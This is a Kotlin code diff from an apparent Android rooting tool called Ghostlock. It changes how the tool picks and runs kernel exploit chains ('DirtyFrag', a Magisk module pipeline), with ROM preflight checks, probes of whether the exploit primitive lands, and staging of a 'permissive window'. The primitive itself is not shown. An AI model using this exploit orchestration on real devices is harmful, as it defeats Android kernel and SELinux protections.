+                val effectiveOrder = if (config.dirtyFragSelectable && !config.dirtyFragOn) {
+                    onLog("<k> pipeline: dirtyfrag off (GhostLock only)")
+                    order.filter { it != "dirtyfrag" }.ifEmpty { listOf("ghostlock") }
+                } else {
+                    order
+                }
                 val decision = PipelineResolver.resolve(
-                    order,
+                    effectiveOrder,
                     ghostlock = { null },
                     dirtyfrag = {
-                        if (fallbackFault) {
-                            "forced failure (debug fault injection)"
+                        val rom = DirtyfragPlan.preflight(
+                            appContext,
+                            File("/system/lib64/libc++.so"),
+                        )
+                        if (!rom.feasible) {
+                            "ROM preflight: " + rom.reasons.joinToString("; ")
                         } else {
-                            val rom = DirtyfragPlan.preflight(
-                                appContext,
-                                File("/system/lib64/libc++.so"),
-                            )
-                            if (!rom.feasible) {
-                                "ROM preflight: " + rom.reasons.joinToString("; ")
-                            } else {
-                                when (val reuse = measuredProfiles.probeReuse(release, Build.FINGERPRINT)) {
-                                    ProbeReuse.Pass -> {
-                                        onLog(
-                                            "<k> probe=db pass (protocol " +
-                                                DirtyfragProbe.ProtocolVersion + ")",
+                            when (val reuse = measuredProfiles.probeReuse(release, Build.FINGERPRINT)) {
+                                ProbeReuse.Pass -> {
+                                    onLog(
+                                        "<k> probe=db pass (protocol " +
+                                            DirtyfragProbe.ProtocolVersion + ")",
+                                    )
+                                    null
+                                }
+                                ProbeReuse.PrimitiveFailed ->
+                                    "measured DB says the primitive does not land"
+                                ProbeReuse.None -> {
+                                    val result = DirtyfragProbe.run(appContext, filesDir)
+                                    val clear =
+                                        result.outcome == DirtyfragProbe.Outcome.Pass ||
+                                            result.outcome == DirtyfragProbe.Outcome.PrimitiveFailed
+                                    if (clear) {
+                                        measuredProfiles.recordDirtyfragProbe(
+                                            release,
+                                            result.outcome,
+                                            Build.FINGERPRINT,
+                                            result.evidence,
                                         )
-                                        null
                                     }
-                                    ProbeReuse.PrimitiveFailed ->
-                                        "measured DB says the primitive does not land"
-                                    ProbeReuse.None -> {
-                                        val result = DirtyfragProbe.run(appContext, filesDir)
-                                        val clear =
-                                            result.outcome == DirtyfragProbe.Outcome.Pass ||
-                                                result.outcome == DirtyfragProbe.Outcome.PrimitiveFailed
-                                        if (clear) {
-                                            measuredProfiles.recordDirtyfragProbe(
-                                                release,
-                                                result.outcome,
-                                                Build.FINGERPRINT,
-                                                result.evidence,
-                                            )
+                                    when (result.outcome) {
+                                        DirtyfragProbe.Outcome.Pass -> {
+                                            onLog("<k> probe=pass ${result.evidence}")
+                                            null
                                         }
-                                        when (result.outcome) {
-                                            DirtyfragProbe.Outcome.Pass -> {
-                                                onLog("<k> probe=pass ${result.evidence}")
-                                                null
-                                            }
-                                            else -> "probe ${result.outcome}: ${result.reason}"
+                                        else -> "probe ${result.outcome}: ${result.reason}"
+                                    }
+                                }
+                            }
+                        }
+                    },
+                    module = {
+                        val spec = config.module
+                        when {
+                            spec == null -> "module pipeline is bundled-only"
+                            config.layers?.bundledAuthoritative != true ->
+                                "module pipeline is bundled-only " +
+                                    "(the bundled profile is not authoritative)"
+                            else -> {
+                                val rom = DirtyfragPlan.preflight(
+                                    appContext,
+                                    File("/system/lib64/libc++.so"),
+                                )
+                                if (!rom.feasible) {
+                                    "ROM preflight: " + rom.reasons.joinToString("; ")
+                                } else {
+                                    val staged = BundledModule.stage(
+                                        appContext,
+                                        spec,
+                                        File(filesDir, "modules"),
+                                    )
+                                    if (staged == null) {
+                                        "module asset missing or asset_sha256 mismatch"
+                                    } else {
+                                        val magisk = MagiskStage.stage(
+                                            appContext,
+                                            File(filesDir, "magiskbin"),
+                                        )
+                                        if (magisk == null) {
+                                            "Magisk manager is not installed or cannot be staged"
+                                        } else {
+                                            onLog(
+                                                "<k> module pair: ${spec.asset} " +
+                                                    "(sha256 ok), magisk=${magisk.packageName}",
+                                            )
+                                            moduleRun = ModuleRun(
+                                                moduleFile = staged,
+                                                vendorFiles = spec.vendorFiles,
+                                                magiskBin = magisk.dir,
+                                            )
+                                            null
                                         }
                                     }
                                 }
@@ -1437,6 +1750,17 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                 onLog("<k> pipeline=$selected (profile order)")
                 selected
             }
+            /* The module chain has no W1: the module itself opens the permissive
+             * window (the root script loads it first). Run the DirtyFrag stage
+             * directly — no native W1 invocation and no wire document. */
+            if (pipeline == "module") {
+                onLog("<b> pipeline=module: no W1; starting the DirtyFrag stage")
+                resetRunState()
+                val run = moduleRun ?: error("module pipeline selected without a staged pair")
+                val moduleCode = runDirtyfragStage(onLog, debugDir, run)
+                onLog("<b> pipeline=module: stage exited code=$moduleCode")
+                return moduleCode
+            }
             var profileBlob = profileController.nativeDocument(config, pipeline)
                 ?: error("profile is unavailable for $release")
             // v2: safe_mode lives in the meta section; there is no fixed slot
@@ -1445,7 +1769,7 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                 profileBlob = NativeProfileDocument.patchSafeMode(profileBlob) ?: profileBlob
             }
             logProfileDigest(onLog, profileBlob)
-            dumpRuntimeProfile(onLog, writeSidecar, release, pair, profileBlob)
+            dumpRuntimeProfile(onLog, writeSidecar, release, profileBlob)
             val ksuOffset = AtomicLong()
             val nativeOffset = AtomicLong()
             val processRef = AtomicReference<Process?>(null)
@@ -1571,10 +1895,8 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
     override suspend fun selectExternalProfile(uri: String): ProfileImportResult =
         withContext(Dispatchers.IO) {
             val release = deviceRelease()
-            val pair = cpuPairs.getOrNull(selectedCpuPair)
-                ?: return@withContext ProfileImportResult.Rejected(listOf("no CPU pair selected"))
             runCatching {
-                profileController.selectExternalProfile(uri, release, pair)
+                profileController.selectExternalProfile(uri, release)
             }.getOrElse {
                 ProfileImportResult.Rejected(
                     listOf(it.message ?: "the profile could not be imported"),
@@ -1583,13 +1905,12 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         }
 
     override suspend fun clearExternalProfile(): ProfileConfig = withContext(Dispatchers.IO) {
-        profileController.clearExternalProfile(deviceRelease(), currentPairOrZero())
+        profileController.clearExternalProfile(deviceRelease())
     }
 
     override fun liveProfileDocument(): String? {
         val release = deviceRelease()
-        val pair = cpuPairs.getOrNull(selectedCpuPair) ?: return null
-        return profileController.renderResolved(release, pair)
+        return profileController.renderResolved(release)
     }
 
     override suspend fun writeProfileDocument(uri: String, text: String): Boolean =
@@ -1617,8 +1938,7 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
     override suspend fun beginEditSession(): ProfileConfig? = withContext(Dispatchers.IO) {
         endEditSession()
         val release = deviceRelease()
-        val pair = cpuPairs.getOrNull(selectedCpuPair) ?: return@withContext null
-        val live = runCatching { profileController.load(release, pair) }.getOrNull()
+        val live = runCatching { profileController.load(release) }.getOrNull()
         if (live?.hasProfile != true) return@withContext null
         val session = AndroidProfileConfigController(
             context = appContext,
@@ -1629,7 +1949,7 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         editSession = session
         editSessionTargetName = profileController.currentSelectionLabel(release)
         editSessionTargetRelease = release
-        runCatching { session.load(release, pair) }.getOrNull()
+        runCatching { session.load(release) }.getOrNull()
     }
 
     override fun editSessionController(): ProfileConfigController? = editSession
@@ -1641,22 +1961,19 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
     override fun editSessionDocument(): String? {
         val session = editSession ?: return null
         val release = editSessionTargetRelease ?: return null
-        val pair = cpuPairs.getOrNull(selectedCpuPair) ?: return null
-        return session.renderResolved(release, pair)
+        return session.renderResolved(release)
     }
 
     override fun editSessionDiff(): List<ProfileDiffRow> {
         val session = editSession ?: return emptyList()
         val release = editSessionTargetRelease ?: return emptyList()
-        val pair = cpuPairs.getOrNull(selectedCpuPair) ?: return emptyList()
-        return session.diffAgainstBundle(release, pair)
+        return session.diffAgainstBundle(release)
     }
 
     override suspend fun rebaseEditSession(): ProfileConfig? = withContext(Dispatchers.IO) {
         val session = editSession ?: return@withContext null
         val release = editSessionTargetRelease ?: return@withContext null
-        val pair = cpuPairs.getOrNull(selectedCpuPair) ?: return@withContext null
-        val config = runCatching { session.rebaseToBundle(release, pair) }.getOrNull()
+        val config = runCatching { session.rebaseToBundle(release) }.getOrNull()
         if (config != null) editSessionTargetName = session.currentSelectionLabel(release)
         config
     }
@@ -1672,8 +1989,7 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
     override suspend fun measurementMergeDiff(): List<MeasurementMergeRow> =
         withContext(Dispatchers.IO) {
             val release = deviceRelease()
-            val pair = cpuPairs.getOrNull(selectedCpuPair) ?: return@withContext emptyList()
-            val numbers = profileController.resolvedNumbers(release, pair)
+            val numbers = profileController.resolvedNumbers(release)
                 ?: return@withContext emptyList()
             /* Only profile-addressable facts: the DirtyFrag probe fact is a
              * runtime decision, and merging it would poison the document. */
@@ -1691,19 +2007,15 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
 
     override fun mergedProfileDocument(): String? {
         val release = deviceRelease()
-        val pair = cpuPairs.getOrNull(selectedCpuPair) ?: return null
         val facts = measuredProfiles.kernel(release)?.profileFacts().orEmpty()
         if (facts.isEmpty()) return null
         return profileController.renderMerged(
             release,
-            pair,
             facts.associate { it.key to it.value },
         )
     }
 
     private fun deviceRelease(): String = System.getProperty("os.version", "").orEmpty()
-
-    private fun currentPairOrZero(): CpuPair = cpuPairs.getOrNull(selectedCpuPair) ?: CpuPair(0, 0)
 
     override fun close() {
         shizukuRunner.close()
@@ -1733,7 +2045,7 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
      * Fields a parsed profile still lacks that only an xbl_config FDT or uefi
      * memory map can fill. Used to prompt for the optional sidecars.
      */
-    /** Resolve a schema-v2 per-device pair for the running device, if present. */
+    /** Resolve a schema-v3 per-device pair for the running device, if present. */
     private fun resolvedForDevice(entry: ValueMap, candidates: List<String>): ValueMap =
         runCatching { PerDevicePhys.resolveFor(entry, candidates).document }.getOrDefault(entry)
 
@@ -1754,45 +2066,13 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
     private fun freshReleases(entries: List<*>): List<String> =
         entries.mapNotNull { (it.asValueMap()?.get("release") as? String) }.distinct()
 
-    private fun buildCpuPairs() {
-        cpuPairs.clear()
-        cpuPairLabels.clear()
-        val online = parseCpuList(readSysFile("/sys/devices/system/cpu/online"))
-        online.groupBy { readMaxFreq(it) }.filterKeys { it > 0 }.toSortedMap(compareByDescending { it }).forEach { (freq, cluster) ->
-                cluster.sorted().chunked(2).filter { it.size == 2 }.forEach { pair ->
-                    cpuPairs += CpuPair(pair[0], pair[1])
-                    cpuPairLabels += "${pair[0]},${pair[1]} · ${formatFreq(freq)}"
-                }
-            }
-        if (CpuPair(0, 1) !in cpuPairs) {
-            cpuPairs += CpuPair(0, 1)
-            val freq = readMaxFreq(0)
-            cpuPairLabels += "0,1" + if (freq > 0) " · ${formatFreq(freq)}" else ""
-        }
-    }
-
-    private fun restoreCpuPair() {
-        val saved = appContext.getSharedPreferences("ghostlock_prefs", Context.MODE_PRIVATE).getString("cpu_pair", null) ?: return
-        val pair = saved.split(',').mapNotNull { it.trim().toIntOrNull() }
-        if (pair.size == 2) cpuPairs.indexOf(CpuPair(pair[0], pair[1])).takeIf { it >= 0 }?.let { selectedCpuPair = it }
-    }
-
     private fun restoreShizukuPreference() {
         val prefs = appContext.getSharedPreferences("ghostlock_prefs", Context.MODE_PRIVATE)
-        shizukuPreferenceSet = prefs.getBoolean("shizuku_explicit", false)
         shizukuEnabled = prefs.getBoolean("shizuku_enabled", false)
     }
 
     private fun restoreForceAttackTest() {
         forceAttackTest = preferences.getBoolean(PrefForceAttackTest, false)
-    }
-
-    private fun restoreSecondWay() {
-        secondWay = preferences.getBoolean(PrefSecondWay, false)
-    }
-
-    private fun restoreFallbackTest() {
-        fallbackTest = preferences.getBoolean(PrefFallbackTest, false)
     }
 
     private fun restoreVrKoTagClear() {
@@ -1813,20 +2093,6 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
             is String -> VrKoMode.fromWire(raw)
             else -> VrKoMode.AUTO
         }
-
-    private fun parseCpuList(value: String): List<Int> = value.split(',').flatMap { part ->
-        val range = part.trim().split('-').mapNotNull { it.toIntOrNull() }
-        when (range.size) {
-            1 -> range
-            2 -> (range[0]..range[1]).toList()
-            else -> emptyList()
-        }
-    }
-
-    private fun readMaxFreq(cpu: Int): Long = readSysFile("/sys/devices/system/cpu/cpu$cpu/cpufreq/cpuinfo_max_freq").toLongOrNull() ?: -1L
-
-    private fun formatFreq(khz: Long): String =
-        if (khz >= 1_000_000L) "%.2f GHz".format(Locale.ROOT, khz / 1_000_000.0) else "%.0f MHz".format(Locale.ROOT, khz / 1000.0)
 
     private fun readSysFile(path: String): String = File(path).takeIf { it.isFile }?.useLines { it.firstOrNull()?.trim().orEmpty() } ?: ""
 
@@ -2068,3 +2334,13 @@ internal fun releaseSupportedByProfileSources(
     bundledReleases: Set<String>,
     importedSelected: Boolean,
 ): Boolean = release in bundledReleases || importedSelected
+
+/**
+ * The timer analyzer's no-BTF layout template for a release, or null when no
+ * template applies. Only the 5.10 series has one (the labelled `5.10`
+ * template); 6.x images carry BTF and supply their own facts. Releases spell
+ * the series `5.10.<patch>-…` — the dash follows the patch level, not the
+ * minor, so `startsWith("5.10-")` matches nothing.
+ */
+internal fun timerLayoutTemplate(release: String): String? =
+    if (release.startsWith("5.10.")) "5.10" else null
